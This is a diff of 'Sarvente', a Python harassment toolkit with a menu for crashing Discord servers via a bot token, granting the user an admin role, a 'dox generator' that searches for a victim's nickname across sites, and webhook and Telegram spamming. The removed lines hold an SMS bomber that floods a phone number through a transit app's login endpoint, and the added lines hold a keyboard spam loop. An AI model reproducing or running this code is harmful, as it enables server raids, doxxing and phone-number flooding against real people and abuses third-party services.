@@ -1,19 +1,29 @@
 import os
 print('Setting up sarvente. Please wait...')
 
-os.system('cd data&title > status.txt&title > token.txt&title > mode.txt&title Sarvente')
-os.system('cls')
+def cls():
+	try:
+		os.system('cls')
+	except:
+		os.system('clear')
+
+open('data/mode.txt', 'w').write('')
+open('data/status.txt', 'w').write('')
+open('data/token.txt', 'w').write('')
+open('data/output.txt', 'w').write('')
+cls()
 
 import requests
-from tqdm import tqdm
+import pyautogui as pag
 import time
 import dhooks
 
 version = 'v1.2'
 
+
+
 def main():
-	os.system('cls')
-	os.system('title Sarvente')
+	cls()
 	print(f'''
 ███████╗ █████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗████████╗███████╗
 ██╔════╝██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
@@ -29,16 +39,16 @@ only Windows | {version} | by therealphantom#1730''')
 3 - Give administrative role
 4 - Dox generator
 5 - Telegram bot sender
-6 - SMS bomber
+6 - Spam tool
 \n''')
 	mode = input()
 	if(mode == '1'):
-		os.system('cls')
+		cls()
 		print('Selected crash discord server.')
 		time.sleep(3)
-		os.system('cls')
+		cls()
 		token = input('Enter discord bot token: ')
-		os.system('cls')
+		cls()
 		print('Saving...')
 		token_file = open('data/token.txt', 'w')
 		token_file.write(token)
@@ -46,7 +56,7 @@ only Windows | {version} | by therealphantom#1730''')
 		time.sleep(1)
 		print('Saved!')
 		time.sleep(2)
-		os.system('cls')
+		cls()
 		os.system('cd data&start botlauncher.cmd')
 		time.sleep(2)
 		print('Summoned discord bot module. Print "!connect" to connect the server')
@@ -62,12 +72,12 @@ only Windows | {version} | by therealphantom#1730''')
 		os.system('taskkill /f /im cmd.exe')
 		main()
 	if mode == '2':
-		os.system('cls')
+		cls()
 		print('Selected webhook sender.')
 		time.sleep(3)
-		os.system('cls')
+		cls()
 		url = input('Enter webhook url: ')
-		os.system('cls')
+		cls()
 		print('Connecting to the webhook...')
 		try:
 			hook = dhooks.Webhook(url)
@@ -76,7 +86,7 @@ only Windows | {version} | by therealphantom#1730''')
 			main()
 		print('Connected!')
 		while True:
-			os.system('cls')
+			cls()
 			print('''Webhook Sender - Sarvente. Type "!wsender exit" to quit\nTo send embed enter "!wsender embed [title] [description]"\n--------------------------------------''')
 			msg = input('Enter message: ')
 			if msg == '!wsender exit':
@@ -87,13 +97,13 @@ only Windows | {version} | by therealphantom#1730''')
 			if msg.split(' ')[0] != '!wsender':
 				hook.send(msg)
 	if mode == '3':
-		os.system('cls')
+		cls()
 		print('Selected give administrative role.')
 		time.sleep(3)
-		os.system('cls')
+		cls()
 		owner_id = input('Enter your id: ')
 		token = input('Enter discord bot token: ')
-		os.system('cls')
+		cls()
 		print('Saving...')
 		token_file = open('data/token.txt', 'w')
 		token_file.write(token)
@@ -101,7 +111,7 @@ only Windows | {version} | by therealphantom#1730''')
 		time.sleep(1)
 		print('Saved!')
 		time.sleep(2)
-		os.system('cls')
+		cls()
 		os.system('cd data&start botlauncher.cmd')
 		print('Summoned discord bot module. Print "!connect" to connect the server')
 		print('Waiting for connect...')
@@ -113,7 +123,7 @@ only Windows | {version} | by therealphantom#1730''')
 			f.close()
 		while open('data/output.txt', 'r').read() != 'clear':
 			pass
-		os.system('cd data&title > output.txt&title Sarvente')
+		open('data/output.txt', 'w').write('')
 		while open('data/status.txt', 'r').read() != 'connected':
 			pass
 		print('Connected.')
@@ -122,12 +132,12 @@ only Windows | {version} | by therealphantom#1730''')
 		os.system('taskkill /f /im cmd.exe')
 		main()
 	if mode == '4':
-		os.system('cls')
+		cls()
 		print('Selected dox generator.')
 		time.sleep(3)
-		os.system('cls')
+		cls()
 		nickname1 = input("Enter victim's nickname: ")
-		os.system('cls')
+		cls()
 		print('Checking nickname...\n')
 		yturl = f'https://www.youtube.com/user/{nickname1}'
 		vkurl = f'https://vk.com/{nickname1}'
@@ -145,15 +155,15 @@ only Windows | {version} | by therealphantom#1730''')
 		input('Press ENTER to quit.')
 		main()
 	if mode == '5':
-		os.system('cls')
+		cls()
 		print('Selected telegram bot sender.')
 		time.sleep(3)
 		token = input('Enter telegram bot token: ')
 		url = f'https://api.telegram.org/bot{token}/'
-		os.system('cls')
+		cls()
 		print('Setting up sender:')
 		username = input('1. Enter your username: ')
-		os.system('cls')
+		cls()
 		print('Send message to telegram bot.')
 		print('Getting message from you...')
 		resp = requests.get(url + 'getUpdates')
@@ -165,11 +175,11 @@ only Windows | {version} | by therealphantom#1730''')
 				if resp_json['result'][0]['message']['from']['username'] == username:
 					chatid = resp_json['result'][0]['message']['chat']['id']
 					empty = False
-		os.system('cls')
+		cls()
 		print(f'Message received!\n\nSender configured:\nChat ID: {chatid}')
 		time.sleep(2)
 		while True:
-			os.system('cls')
+			cls()
 			print('Telegram bot sender - Sarvente.')
 			print('To quit enter !tsender exit')
 			print('----------------------------------')
@@ -181,28 +191,42 @@ only Windows | {version} | by therealphantom#1730''')
 				print(f'Message error! Status code: {resp.status_code}')
 				time.sleep(3)
 	if mode == '6':
-		headers = ({'User-Agent':'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
-		os.system('cls')
-		print('Selected sms bomber.')
+		cls()
+		print('Selected spam tool.')
 		time.sleep(3)
-		os.system('cls')
-		print('Sarvente - SMS Bomber')
+		cls()
+		print('Sarvente - Spam Tool')
 		print('----------------------------')
-		phone = input('Enter phone number (without plus): ')
-		url = f'https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{phone}'
-		cycles = int(input('Enter number of messages: '))
-		success = 0
-		fail = 0
-		for i in tqdm(range(cycles)):
-			resp = requests.get(url)
-			if resp.status_code == 200:
-				success += 1
-			else:
-				fail += 1
-		print(f'Succesful messages: {success}')
-		print(f'Failed messages: {fail}')
-		input('Press ENTER to quit.')
-		main()
+		interval = float(input('Enter interval: '))
+		message = input('Enter message: ')
+		pag.FAILSAFE = True
+		cls()
+		print('To stop, move the mouse pointer over the upper right corner of the screen.')
+		input('Press ENTER to start.')
+		cls()
+		print('Stating in 5')
+		time.sleep(1)
+		cls()
+		print('Stating in 4')
+		time.sleep(1)
+		cls()
+		print('Stating in 3')
+		time.sleep(1)
+		cls()
+		print('Stating in 2')
+		time.sleep(1)
+		cls()
+		print('Stating in 1')
+		time.sleep(1)
+		cls()
+		print('Spamming!')
+		while True:
+			try:
+				time.sleep(interval)
+				pag.typewrite(message)
+				pag.press('enter')
+			except:
+				break
 
 	main()
 
